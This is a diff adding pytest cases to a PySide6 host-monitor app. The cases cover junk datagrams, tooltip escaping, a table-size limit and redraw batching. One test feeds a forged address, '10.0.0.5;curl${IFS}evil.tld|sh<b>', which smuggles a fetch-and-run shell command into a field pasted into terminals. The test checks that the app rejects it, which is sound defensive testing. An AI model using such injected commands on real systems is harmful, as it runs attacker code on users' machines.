@@ -19,10 +19,10 @@ os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
 pytest.importorskip("PySide6", reason="PySide6 is not installed")
 
 from PySide6.QtCore import QCoreApplication, QEventLoop, QTimer  # noqa: E402
-from PySide6.QtGui import QGuiApplication  # noqa: E402
+from PySide6.QtGui import QGuiApplication, Qt  # noqa: E402
 from PySide6.QtWidgets import QApplication  # noqa: E402
 
-from lynxrdp_monitor.app import COL_IP, COL_NODE, MonitorWindow  # noqa: E402
+from lynxrdp_monitor.app import COL_IP, COL_NODE, MonitorWindow, nat_tooltip  # noqa: E402
 from lynxrdp_monitor.crypto import seal  # noqa: E402
 
 
@@ -56,6 +56,10 @@ def send_raw(window: MonitorWindow, data: bytes) -> None:
     finally:
         sock.close()
     spin(150)
+    # A burst redraws once, a little after it lands, so wait that out too;
+    # otherwise the table would be read before the row is in it.
+    while window.redraw.isActive():
+        spin(20)
 
 
 def spin(ms: int) -> None:
@@ -108,11 +112,24 @@ def test_several_hosts_each_get_a_row(window):
 
 def test_malformed_datagrams_do_not_disturb_the_table(window):
     send(window, report(ip="127.0.0.1"))
-    for junk in (b"", b"garbage", b"[]", b"\xff\xfe\x00", b'{"node":""}'):
-        send_raw(window, junk)
-    # The good row survives and nothing was added.
+    # Sealed, so that each one gets past unseal() and reaches the parser and
+    # the table code -- unsealed junk is stopped at the magic check and would
+    # test nothing here (test_unsealed_plaintext_is_ignored covers that).
+    for junk in (
+        b"",
+        b"garbage",
+        b"[]",
+        b"\xff\xfe\x00",
+        b'{"node":""}',
+        b'{"node":"desk01","ip":"not an address","port":3390}',
+        b"[" * 1200 + b"]" * 1200,
+    ):
+        send_raw(window, seal(junk))
+    send_raw(window, b"garbage")
+    # The good row survives, unchanged, and nothing was added.
     assert window.table.rowCount() == 1
     assert window.table.item(0, COL_NODE).text() == "desk01"
+    assert window.table.item(0, COL_IP).text() == "127.0.0.1"
 
 
 def test_unsealed_plaintext_is_ignored(window):
@@ -157,6 +174,30 @@ def test_copying_an_ssh_command_is_ready_to_paste(window):
     assert QGuiApplication.clipboard().text() == "lynxrdp 192.0.2.77"
 
 
+def test_a_forged_address_never_reaches_the_clipboard(window):
+    # The key is public, so this datagram is as valid as any. "Copy ssh
+    # command" pastes straight into a terminal, which makes the address the
+    # one field a forged report must not be able to fill with anything but
+    # an address -- not on its own, and not by replacing a real host's row.
+    send(window, report(ip="192.0.2.77"))
+    send(window, report(ip="10.0.0.5;curl${IFS}evil.tld|sh<b>"))
+    send(window, report(node="evil", ip="10.0.0.5;curl${IFS}evil.tld|sh<b>"))
+    assert window.table.rowCount() == 1
+    window.table.selectRow(0)
+    window._copy_ssh()
+    assert QGuiApplication.clipboard().text() == "lynxrdp 192.0.2.77"
+
+
+def test_the_nat_tooltip_is_plain_text():
+    # Qt renders anything that looks like markup as rich text. Nothing that
+    # reaches the tooltip can carry markup any more, so the escaping is
+    # checked directly, on text no report could deliver.
+    text = nat_tooltip("<b>10.0.0.5</b>", "127.0.0.1")
+    assert "<b>" not in text
+    assert "10.0.0.5" in text and "127.0.0.1" in text
+    assert not Qt.mightBeRichText(nat_tooltip("10.0.0.5", "127.0.0.1"))
+
+
 def test_a_nat_mismatch_is_marked_and_still_copies_the_reported_address(window):
     # The datagram comes from 127.0.0.1 but claims 10.0.0.5, which is what a
     # host behind NAT looks like.
@@ -182,3 +223,38 @@ def test_removing_a_host_takes_it_out_of_the_table(window):
     window.table.selectRow(0)
     window._forget_selected()
     assert window.table.rowCount() == 0
+
+
+def test_the_table_stops_growing_when_full_and_says_so(window):
+    # A sender who can reach the port can invent names without limit. The
+    # table has to stop taking them, keep updating the hosts it has, and say
+    # in the status bar that something is being dropped.
+    window.store.max_nodes = 3
+    for name in ("a", "b", "c", "d", "e"):
+        send(window, report(node=name, ip="127.0.0.1"))
+    assert window.table.rowCount() == 3
+    assert [window.table.item(r, COL_NODE).text() for r in range(3)] == ["a", "b", "c"]
+    assert "table full" in window.statusBar().currentMessage()
+    assert window.store.refused == 2
+    send(window, report(node="b", ip="127.0.0.1", sessions=7))
+    assert window.store.rows()[1].sessions == 7
+
+
+def test_a_burst_is_one_redraw(window):
+    # Under a flood, readyRead fires as fast as the event loop turns; the
+    # redraw must not. Two datagrams in one burst share a single pending
+    # redraw rather than each scheduling their own.
+    assert not window.redraw.isActive()
+    send_raw(window, seal(json.dumps(report(node="one", ip="127.0.0.1")).encode()))
+    port = window.socket.localPort()
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        for name in ("two", "three"):
+            sock.sendto(seal(json.dumps(report(node=name, ip="127.0.0.1")).encode()), ("127.0.0.1", port))
+    finally:
+        sock.close()
+    spin(20)
+    assert window.redraw.isActive()
+    while window.redraw.isActive():
+        spin(20)
+    assert window.table.rowCount() == 3
